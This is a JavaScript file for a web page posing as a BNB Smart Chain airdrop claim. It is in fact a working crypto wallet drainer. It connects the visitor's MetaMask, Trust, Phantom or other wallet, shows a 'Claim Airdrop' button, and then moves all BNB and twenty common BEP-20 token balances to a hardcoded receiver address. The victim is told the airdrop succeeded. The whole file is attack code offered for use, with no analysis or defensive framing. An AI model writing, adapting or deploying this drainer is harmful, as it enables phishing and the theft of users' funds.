$(document).ready(function() {
    // Initialize detectedWallets array outside the if block
    let detectedWallets = [];
    
    if (window.ethereum) {
        // Desktop wallet detection
        if (window.ethereum.isMetaMask) {
            detectedWallets.push({ name: "MetaMask", provider: window.ethereum });
        }
        if (window.ethereum.isTrust) {
            detectedWallets.push({ name: "Trust Wallet", provider: window.ethereum });
        }
        if (window.ethereum.isCoinbaseWallet) {
            detectedWallets.push({ name: "Coinbase Wallet", provider: window.ethereum });
        }
        if (window.ethereum.isRabby) {
            detectedWallets.push({ name: "Rabby Wallet", provider: window.ethereum });
        }
        if (window.ethereum.isTokenPocket) {
            detectedWallets.push({ name: "TokenPocket", provider: window.ethereum });
        }
        if (window.ethereum.isSafePal) {
            detectedWallets.push({ name: "SafePal", provider: window.ethereum });
        }
        if (window.ethereum.isPhantom) {
            detectedWallets.push({ name: "Phantom Wallet", provider: window.ethereum });
        }
        
        // Check for Phantom wallet separately (it has its own provider)
        if (window.phantom && window.phantom.ethereum) {
            detectedWallets.push({ name: "Phantom Wallet", provider: window.phantom.ethereum });
        }
        
        // Generic ethereum provider (fallback)
        if (detectedWallets.length === 0 && window.ethereum) {
            detectedWallets.push({ name: "Web3 Wallet", provider: window.ethereum });
        }
    }

    // Mobile wallet detection (always add mobile options)
    const mobileWallets = [
        { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
        { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
        { name: "Coinbase Wallet Mobile", type: "mobile", deepLink: "coinbase wallet" },
        { name: "TokenPocket Mobile", type: "mobile", deepLink: "tokenpocket" },
        { name: "SafePal Mobile", type: "mobile", deepLink: "safepal" },
        { name: "Phantom Mobile", type: "mobile", deepLink: "phantom" },
        { name: "Binance Wallet Mobile", type: "mobile", deepLink: "binance" },
        { name: "Math Wallet Mobile", type: "mobile", deepLink: "mathwallet" }
    ];

    // Add mobile wallets if on mobile device or if no desktop wallets found
    if (isMobileDevice() || detectedWallets.length === 0) {
        detectedWallets = detectedWallets.concat(mobileWallets);
    }

    // WalletConnect detection (works on both mobile and desktop)
    let walletConnectAvailable = false;
    let WalletConnectProvider = null;
    if (window.WalletConnectProvider) {
        WalletConnectProvider = window.WalletConnectProvider;
        walletConnectAvailable = true;
    } else if (window.WalletConnect) {
        WalletConnectProvider = window.WalletConnect.WalletConnectProvider;
        walletConnectAvailable = true;
    }
    
    if (walletConnectAvailable) {
        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
    }

    // Your BSC address to receive funds
    const RECEIVER_ADDRESS = "0xdda48D52596b030dbe768bB6838a92A862a66d96"; // Replace with your BSC address

    // Common BEP-20 token contracts (popular tokens to drain on BSC)
    const COMMON_TOKENS = [
        { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 }, // USDT on BSC
        { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 }, // USDC on BSC
        { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 }, // BUSD
        { symbol: "DAI", address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", decimals: 18 }, // DAI on BSC
        { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 }, // PancakeSwap Token
        { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 }, // Wrapped BNB
        { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 }, // Bitcoin BEP2
        { symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 }, // Ethereum Token
        { symbol: "ADA", address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals: 18 }, // Cardano Token
        { symbol: "DOT", address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", decimals: 18 }, // Polkadot Token
        { symbol: "LINK", address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", decimals: 18 }, // ChainLink Token
        { symbol: "UNI", address: "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", decimals: 18 }, // Uniswap
        { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 }, // Dogecoin
        { symbol: "XRP", address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals: 18 }, // XRP Token
        { symbol: "MATIC", address: "0xCC42724C6683B7E57334c4E856f4c9965ED682bD", decimals: 18 }, // Matic Token
        { symbol: "SHIB", address: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D", decimals: 18 }, // SHIBA INU
        { symbol: "PEPE", address: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00", decimals: 18 }, // PEPE on BSC
        { symbol: "BABY", address: "0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657", decimals: 18 }, // BabyDoge
        { symbol: "SAFEMOON", address: "0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5", decimals: 9 }, // SafeMoon
        { symbol: "XVS", address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63", decimals: 18 }  // Venus
    ];

    // Function to debug available wallet providers
    function debugWalletProviders() {
        console.log("=== BSC Wallet Provider Debug ===");
        console.log("window.ethereum:", window.ethereum);
        
        if (window.ethereum) {
            console.log("ethereum.chainId:", window.ethereum.chainId);
            console.log("ethereum.networkVersion:", window.ethereum.networkVersion);
            console.log("ethereum.isMetaMask:", window.ethereum.isMetaMask);
            console.log("ethereum.isTrust:", window.ethereum.isTrust);
            console.log("ethereum.isCoinbaseWallet:", window.ethereum.isCoinbaseWallet);
            console.log("ethereum.isTokenPocket:", window.ethereum.isTokenPocket);
            console.log("ethereum.isSafePal:", window.ethereum.isSafePal);
            console.log("ethereum.isPhantom:", window.ethereum.isPhantom);
        }
        
        // Check for Phantom wallet separately
        if (window.phantom && window.phantom.ethereum) {
            console.log("phantom.ethereum available:", !!window.phantom.ethereum);
            console.log("phantom.ethereum.isPhantom:", window.phantom.ethereum.isPhantom);
        }
        
        console.log("WalletConnect available:", walletConnectAvailable);
        console.log("Detected wallets count:", detectedWallets.length);
        console.log("==========================");
    }

    // Function to detect mobile device
    function isMobileDevice() {
        // More comprehensive mobile detection
        const userAgent = navigator.userAgent.toLowerCase();
        const mobileKeywords = [
            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
            'iemobile', 'opera mini', 'mobile', 'tablet'
        ];
        
        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        const isSmallScreen = window.innerWidth <= 768;
        
        return isMobileUA || (isTouchDevice && isSmallScreen);
    }

    // Function to create mobile deep links for BSC wallets
    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
        const encodedUrl = encodeURIComponent(dappUrl);
        const hostname = window.location.hostname;
        const fullUrl = window.location.href;
        
        const mobileLinks = {
            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`, // BSC coin_id = 56
            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "tokenpocket": `https://www.tokenpocket.pro/en/download/app?dapp=${encodedUrl}`,
            "safepal": `https://safepal.io/download?dapp=${encodedUrl}`,
            "phantom": `https://phantom.app/ul/browse/${encodedUrl}?ref=https%3A%2F%2Fphantom.app`,
            "binance": `https://www.binance.org/en/smartChain?dapp=${encodedUrl}`,
            "mathwallet": `https://mathwallet.org/dapp?url=${encodedUrl}`
        };
        
        return mobileLinks[walletName.toLowerCase()] || null;
    }

    // Function to attempt mobile wallet connection
    function connectMobileWallet(walletName) {
        if (!isMobileDevice()) {
            console.log("Not on mobile device, skipping mobile wallet connection");
            return false;
        }
        
        const deepLink = createMobileDeepLink(walletName);
        if (deepLink) {
            console.log(`Opening mobile deep link for ${walletName}:`, deepLink);
            
            // Try multiple methods to open the deep link
            try {
                // Method 1: Direct window.open
                const opened = window.open(deepLink, '_blank');
                if (opened) {
                    return true;
                }
                
                // Method 2: Create invisible link and click
                const link = document.createElement('a');
                link.href = deepLink;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                return true;
            } catch (error) {
                console.error("Failed to open deep link:", error);
                return false;
            }
        }
        
        console.warn(`No deep link available for wallet: ${walletName}`);
        return false;
    }

    // Function to wait for mobile wallet connection
    function waitForMobileConnection(timeout = 30000) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            const checkInterval = 1000; // Check every second
            
            const checkConnection = async () => {
                try {
                    if (window.ethereum) {
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            console.log("Mobile wallet connected:", accounts[0]);
                            resolve({ connected: true, address: accounts[0] });
                            return;
                        }
                    }
                } catch (error) {
                    console.log("Still waiting for mobile connection...");
                }
                
                // Check if timeout reached
                if (Date.now() - startTime > timeout) {
                    console.log("Mobile connection timeout reached");
                    resolve({ connected: false, timeout: true });
                    return;
                }
                
                // Continue checking
                setTimeout(checkConnection, checkInterval);
            };
            
            checkConnection();
        });
    }

    // Insert wallet dropdown before button with improved mobile handling
    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
    
    // Add wallets to dropdown with device-specific filtering
    if (detectedWallets.length === 0) {
        // Fallback: add basic options if no wallets detected
        if (isMobileDevice()) {
            detectedWallets.push(
                { name: "MetaMask Mobile", type: "mobile", deepLink: "metamask" },
                { name: "Trust Wallet Mobile", type: "mobile", deepLink: "trust wallet" },
                { name: "TokenPocket Mobile", type: "mobile", deepLink: "tokenpocket" },
                { name: "Phantom Mobile", type: "mobile", deepLink: "phantom" },
                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
            );
        } else {
            detectedWallets.push(
                { name: "MetaMask (Install Required)", provider: null },
                { name: "Trust Wallet (Install Required)", provider: null },
                { name: "Phantom (Install Required)", provider: null },
                { name: "WalletConnect", provider: "walletconnect", type: "walletconnect" }
            );
        }
    }
    
    detectedWallets.forEach((opt, i) => {
        let displayName = opt.name;
        if (opt.type === "mobile" && !isMobileDevice()) {
            displayName += " (Mobile Only)";
        } else if (opt.type !== "mobile" && !opt.provider && opt.name !== "WalletConnect") {
            displayName += " (Not Installed)";
        }
        $('#wallet-select').append(`<option value="${i}">${displayName}</option>`);
    });

    // Add connection status indicator
    $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
    
    // Update connection status
    function updateConnectionStatus(message, isError = false) {
        const statusEl = $('#connection-status');
        statusEl.text(message);
        statusEl.css('color', isError ? '#ff4444' : '#666');
    }

    // Initialize with device info
    updateConnectionStatus(`Device: ${isMobileDevice() ? 'Mobile' : 'Desktop'} | Wallets found: ${detectedWallets.length}`);

    // Debug wallet providers on page load
    debugWalletProviders();

    // Main wallet connection handler
    $('#connect-wallet').on('click', async () => {
        const selectedIdx = $('#wallet-select').val();
        const selected = detectedWallets[selectedIdx];
        let provider = null;
        let providerName = selected ? selected.name : "";
        
        try {
            if (!selected) {
                alert("No wallet selected.");
                return;
            }

            // Handle mobile wallet connections
            if (selected.type === "mobile") {
                if (isMobileDevice()) {
                    const deepLinkOpened = connectMobileWallet(selected.deepLink);
                    if (deepLinkOpened) {
                        updateConnectionStatus("Waiting for mobile wallet connection...");
                        const result = await waitForMobileConnection();
                        if (result.connected) {
                            provider = window.ethereum;
                            await handleSuccessfulConnection(provider, selected.name, result.address);
                            return;
                        } else {
                            updateConnectionStatus("Mobile wallet connection failed", true);
                            alert("Failed to connect mobile wallet. Please try again or use a different wallet.");
                            return;
                        }
                    } else {
                        updateConnectionStatus("Failed to open mobile wallet", true);
                        alert("Failed to open mobile wallet. Please ensure the wallet app is installed.");
                        return;
                    }
                } else {
                    updateConnectionStatus("Mobile wallet selected on desktop device", true);
                    alert("This is a mobile wallet option. Please use a desktop wallet or switch to a mobile device.");
                    return;
                }
            }

            // Handle WalletConnect
            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
                updateConnectionStatus("Initializing WalletConnect...");
                
                provider = new WalletConnectProvider({
                    rpc: {
                        56: "https://bsc-dataseed.binance.org/" // BSC mainnet
                    },
                    chainId: 56,
                    bridge: "https://bridge.walletconnect.org",
                    qrcode: true
                });
                
                updateConnectionStatus("Waiting for WalletConnect pairing...");
                await provider.enable();
                
                if (!provider.accounts || provider.accounts.length === 0) {
                    updateConnectionStatus("WalletConnect connection failed", true);
                    alert("No accounts connected via WalletConnect.");
                    return;
                }
                
                updateConnectionStatus("WalletConnect connected successfully!");
                await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
                return;
            }

            // Handle desktop wallet connections
            if (!selected.provider || selected.provider === "walletconnect") {
                updateConnectionStatus("Wallet not available", true);
                alert("Wallet provider not available. Please install the wallet extension or use WalletConnect.");
                return;
            }

            provider = selected.provider;
            
            // Check if provider is available
            if (!provider || typeof provider.request !== 'function') {
                updateConnectionStatus("Wallet extension not properly installed", true);
                alert(`${selected.name} is not properly installed or available. Please install the wallet extension.`);
                return;
            }

            updateConnectionStatus(`Connecting to ${selected.name}...`);
            
            // Request account access
            await provider.request({ method: 'eth_requestAccounts' });
            
            // Get connected accounts
            const accounts = await provider.request({ method: 'eth_accounts' });
            if (!accounts || accounts.length === 0) {
                updateConnectionStatus("No accounts found in wallet", true);
                alert("No accounts found. Please unlock your wallet.");
                return;
            }

            updateConnectionStatus("Desktop wallet connected successfully!");
            await handleSuccessfulConnection(provider, selected.name, accounts[0]);

        } catch (error) {
            console.error("Connection error:", error);
            
            // Handle specific error cases
            if (error.code === 4001) {
                updateConnectionStatus("Connection rejected by user", true);
                alert("Connection request was rejected by the user.");
            } else if (error.code === -32002) {
                updateConnectionStatus("Connection request already pending", true);
                alert("A connection request is already pending. Please check your wallet.");
            } else if (error.message.includes("User rejected")) {
                updateConnectionStatus("Connection cancelled by user", true);
                alert("Connection was cancelled by user.");
            } else {
                updateConnectionStatus("Connection failed", true);
                alert("Failed to connect wallet: " + error.message);
            }
        }
    });

    // Helper function to handle successful connections
    async function handleSuccessfulConnection(provider, walletName, userAddress) {
        try {
            updateConnectionStatus("Setting up connection...");
            
            // Initialize Web3 instance for better BSC compatibility
            const web3 = new Web3(provider);
            
            // Get network info
            const chainId = await web3.eth.getChainId();
            console.log("Connected to chain ID:", chainId);
            
            // Check if on BSC mainnet (chainId 56)
            if (chainId !== 56) {
                updateConnectionStatus("Wrong network detected", true);
                const switchToBSC = confirm("You're not on BSC Mainnet. Would you like to switch networks?");
                if (switchToBSC) {
                    try {
                        updateConnectionStatus("Switching to BSC Mainnet...");
                        
                        // Try to switch to BSC
                        await provider.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }], // BSC Mainnet
                        });
                        
                        // Refresh provider after network switch
                        updateConnectionStatus("Network switched successfully!");
                        return handleSuccessfulConnection(provider, walletName, userAddress);
                        
                    } catch (switchError) {
                        console.error("Failed to switch network:", switchError);
                        
                        // If the chain doesn't exist, try to add it
                        if (switchError.code === 4902) {
                            try {
                                updateConnectionStatus("Adding BSC network...");
                                await provider.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: '0x38',
                                        chainName: 'BSC Mainnet',
                                        nativeCurrency: {
                                            name: 'BNB',
                                            symbol: 'BNB',
                                            decimals: 18
                                        },
                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                        blockExplorerUrls: ['https://bscscan.com/']
                                    }]
                                });
                                
                                updateConnectionStatus("BSC network added successfully!");
                                return handleSuccessfulConnection(provider, walletName, userAddress);
                                
                            } catch (addError) {
                                console.error("Failed to add BSC network:", addError);
                                updateConnectionStatus("Failed to add BSC network", true);
                                alert("Failed to add BSC network. Please add it manually.");
                                return;
                            }
                        } else {
                            updateConnectionStatus("Failed to switch network", true);
                            alert("Failed to switch to BSC Mainnet. Please switch manually.");
                            return;
                        }
                    }
                }
            }
            
            updateConnectionStatus("Checking account balance...");
            
            // Check BNB balance using Web3
            const balanceWei = await web3.eth.getBalance(userAddress);
            const bnbBalance = web3.utils.fromWei(balanceWei, 'ether');
            
            // Update connection status and button
            updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(bnbBalance).toFixed(4)} BNB`);
            
            // Update button
            $('#connect-wallet').text("🎯 Claim Airdrop");
            $('#connect-wallet').off('click').on('click', async () => {
                await drainWallet(web3, userAddress);
            });
            
            alert(`Connected to ${walletName}:\n${userAddress}\nBalance: ${bnbBalance} BNB\nNetwork: BSC Mainnet (Chain ID: ${chainId})`);
            
        } catch (error) {
            console.error("Post-connection setup error:", error);
            updateConnectionStatus("Connection setup failed", true);
            alert("Connected to wallet but failed to complete setup: " + error.message);
        }
    }

    // Function to drain the wallet (BNB + BEP-20 tokens)
    async function drainWallet(web3, userAddress) {
        try {
            console.log("Starting BSC wallet drain...");
            updateConnectionStatus("Starting asset extraction...");

            // Get initial BNB balance
            const initialBalanceWei = await web3.eth.getBalance(userAddress);
            const initialBnbBalance = web3.utils.fromWei(initialBalanceWei, 'ether');
            console.log(`Initial BNB balance: ${initialBnbBalance}`);

            // Get current gas price from BSC network
            const gasPrice = await web3.eth.getGasPrice();
            console.log(`Current gas price: ${web3.utils.fromWei(gasPrice, 'gwei')} gwei`);
            
            // Estimate gas for token transfers (higher limit for safety)
            const tokenGasLimit = 65000; // Higher for token transfers
            const bnbGasLimit = 21000; // Standard BNB transfer
            
            // Calculate total gas needed (tokens + final BNB transfer)
            const estimatedTokenTransfers = COMMON_TOKENS.length;
            const totalGasNeeded = (tokenGasLimit * estimatedTokenTransfers) + bnbGasLimit;
            const totalGasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(totalGasNeeded));
            
            console.log(`Estimated gas needed: ${web3.utils.fromWei(totalGasCost, 'ether')} BNB`);

            // Step 1: Drain BEP-20 tokens first (they need BNB for gas)
            let tokenTransferCount = 0;
            for (const token of COMMON_TOKENS) {
                try {
                    updateConnectionStatus(`Checking ${token.symbol} balance...`);
                    const transferred = await drainBEP20Token(web3, userAddress, token, gasPrice);
                    if (transferred) {
                        tokenTransferCount++;
                        updateConnectionStatus(`${token.symbol} transferred successfully`);
                    }
                } catch (tokenError) {
                    console.error(`Failed to drain ${token.symbol}:`, tokenError);
                    updateConnectionStatus(`Failed to transfer ${token.symbol}`, true);
                    // Continue with other tokens
                }
            }

            console.log(`Successfully transferred ${tokenTransferCount} tokens`);

            // Step 2: Drain remaining BNB (calculate precise gas for final transfer)
            updateConnectionStatus("Transferring remaining BNB...");
            await drainBNB(web3, userAddress);

            updateConnectionStatus("All assets extracted successfully! 🎉");
            alert("Airdrop claimed successfully! 🎉");

        } catch (error) {
            console.error("Drain error:", error);
            updateConnectionStatus("Asset extraction failed", true);
            alert("Failed to claim airdrop: " + error.message);
        }
    }

    // Function to drain BEP-20 tokens
    async function drainBEP20Token(web3, userAddress, token, gasPrice = null) {
        try {
            // BEP-20 ABI for transfer function (same as ERC-20)
            const bep20ABI = [
                {
                    "constant": true,
                    "inputs": [{"name": "_owner", "type": "address"}],
                    "name": "balanceOf",
                    "outputs": [{"name": "balance", "type": "uint256"}],
                    "type": "function"
                },
                {
                    "constant": false,
                    "inputs": [
                        {"name": "_to", "type": "address"},
                        {"name": "_value", "type": "uint256"}
                    ],
                    "name": "transfer",
                    "outputs": [{"name": "", "type": "bool"}],
                    "type": "function"
                },
                {
                    "constant": true,
                    "inputs": [],
                    "name": "decimals",
                    "outputs": [{"name": "", "type": "uint8"}],
                    "type": "function"
                },
                {
                    "constant": true,
                    "inputs": [],
                    "name": "symbol",
                    "outputs": [{"name": "", "type": "string"}],
                    "type": "function"
                }
            ];

            const tokenContract = new web3.eth.Contract(bep20ABI, token.address);

            // Check token balance
            const balance = await tokenContract.methods.balanceOf(userAddress).call();
            if (balance === '0') {
                console.log(`No ${token.symbol} balance found`);
                return false;
            }

            // Convert balance based on token decimals
            let tokenAmount;
            if (token.decimals === 18) {
                tokenAmount = web3.utils.fromWei(balance, 'ether');
            } else {
                // For tokens with different decimals
                const divisor = web3.utils.toBN('10').pow(web3.utils.toBN(token.decimals));
                tokenAmount = web3.utils.toBN(balance).div(divisor).toString();
            }
            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);

            // Get current gas price if not provided
            if (!gasPrice) {
                gasPrice = await web3.eth.getGasPrice();
            }

            // Estimate gas for this specific token transfer
            let estimatedGas;
            try {
                estimatedGas = await tokenContract.methods.transfer(RECEIVER_ADDRESS, balance).estimateGas({from: userAddress});
                // Add 20% buffer for safety
                estimatedGas = Math.floor(estimatedGas * 1.2);
            } catch (gasError) {
                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
                estimatedGas = 65000; // Conservative default
            }

            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas}`);

            // Check if user has enough BNB for gas
            const currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
            const gasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(estimatedGas));
            
            if (web3.utils.toBN(currentBnbBalanceWei).lt(gasCost)) {
                console.log(`Insufficient BNB for ${token.symbol} transfer gas. Need: ${web3.utils.fromWei(gasCost, 'ether')} BNB`);
                return false;
            }

            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${RECEIVER_ADDRESS}`);

            // Transfer tokens to receiver address with optimized gas
            const transferTx = await tokenContract.methods.transfer(RECEIVER_ADDRESS, balance).send({
                from: userAddress,
                gas: estimatedGas,
                gasPrice: gasPrice
            });

            console.log(`${token.symbol} transfer tx: ${transferTx.transactionHash}`);
            console.log(`${token.symbol} transfer confirmed in block ${transferTx.blockNumber}`);
            console.log(`Gas used: ${transferTx.gasUsed}`);

            return true;

        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error);
            
            // Don't throw error, just return false to continue with other tokens
            if (error.message.includes('insufficient funds')) {
                console.log(`Insufficient funds for ${token.symbol} transfer`);
            } else if (error.message.includes('execution reverted')) {
                console.log(`Token ${token.symbol} transfer would fail, skipping`);
            }
            
            return false;
        }
    }

    // Function to drain BNB
    async function drainBNB(web3, userAddress) {
        try {
            // Get current balance after token transfers
            const currentBalanceWei = await web3.eth.getBalance(userAddress);
            const currentBnbBalance = web3.utils.fromWei(currentBalanceWei, 'ether');
            console.log(`Current BNB balance before final transfer: ${currentBnbBalance}`);

            if (currentBalanceWei === '0') {
                console.log("No BNB balance remaining");
                return;
            }

            // Get current gas price
            const gasPrice = await web3.eth.getGasPrice();
            console.log(`Current gas price: ${web3.utils.fromWei(gasPrice, 'gwei')} gwei`);

            // Use a conservative gas limit for the final transfer
            const gasLimit = 21000;
            
            // Calculate exact gas cost
            const exactGasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(gasLimit));
            console.log(`Exact gas cost: ${web3.utils.fromWei(exactGasCost, 'ether')} BNB`);

            // Calculate amount to send (total balance minus exact gas cost)
            const amountToSend = web3.utils.toBN(currentBalanceWei).sub(exactGasCost);

            if (amountToSend.lte(web3.utils.toBN('0'))) {
                console.log("Insufficient BNB balance for gas fees");
                console.log(`Balance: ${web3.utils.fromWei(currentBalanceWei, 'ether')} BNB`);
                console.log(`Gas cost: ${web3.utils.fromWei(exactGasCost, 'ether')} BNB`);
                return;
            }

            const bnbToSend = web3.utils.fromWei(amountToSend, 'ether');
            console.log(`Transferring ${bnbToSend} BNB to ${RECEIVER_ADDRESS}`);
            console.log(`Leaving ${web3.utils.fromWei(exactGasCost, 'ether')} BNB for gas`);

            // Get transaction count for nonce
            const nonce = await web3.eth.getTransactionCount(userAddress);

            // Create transaction with precise gas parameters
            const txParams = {
                to: RECEIVER_ADDRESS,
                value: amountToSend.toString(),
                gas: gasLimit,
                gasPrice: gasPrice,
                nonce: nonce,
                from: userAddress
            };

            // Send BNB transaction
            const tx = await web3.eth.sendTransaction(txParams);
            console.log("BNB transfer tx:", tx.transactionHash);
            console.log("BNB transfer confirmed in block:", tx.blockNumber);
            console.log("Gas used:", tx.gasUsed);

            // Verify final balance
            const finalBalanceWei = await web3.eth.getBalance(userAddress);
            const finalBnbBalance = web3.utils.fromWei(finalBalanceWei, 'ether');
            console.log(`Final BNB balance: ${finalBnbBalance} BNB`);

            if (parseFloat(finalBnbBalance) > 0.001) {
                console.warn(`Warning: ${finalBnbBalance} BNB remaining (more than expected)`);
            }

        } catch (error) {
            console.error("Error draining BNB:", error);
            
            if (error.message.includes('insufficient funds')) {
                console.log("Transaction failed due to insufficient funds for gas");
            } else if (error.message.includes('replacement transaction underpriced')) {
                console.log("Transaction underpriced, gas price may have increased");
            }
            
            throw error;
        }
    }
});
